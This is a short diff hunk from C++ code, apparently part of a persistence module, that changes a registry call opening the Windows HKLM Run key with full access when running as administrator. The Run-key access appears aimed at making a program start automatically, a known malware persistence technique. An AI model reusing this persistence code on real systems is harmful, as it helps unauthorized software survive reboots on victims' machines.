@@ -61,7 +61,7 @@ void  Persistence::main()
     cout <<"PERSI MAIN: " << path_prog << endl;
     if(a_is_admin) //if admin
     {  
-        if(long statusOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,KEY_ALL_ACCESS,
+        if(long statusOpen = RegOpenKeyExW(HKEY_LOCAL_MACHINE,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,KEY_ALL_ACCESS,
         &hKey) == ERROR_SUCCESS) //https://stackoverflow.com/questions/820846/regopenkeyex-fails-on-hkey-local-machine
         {
             cout << "OPEN KEY is admin: " << endl;
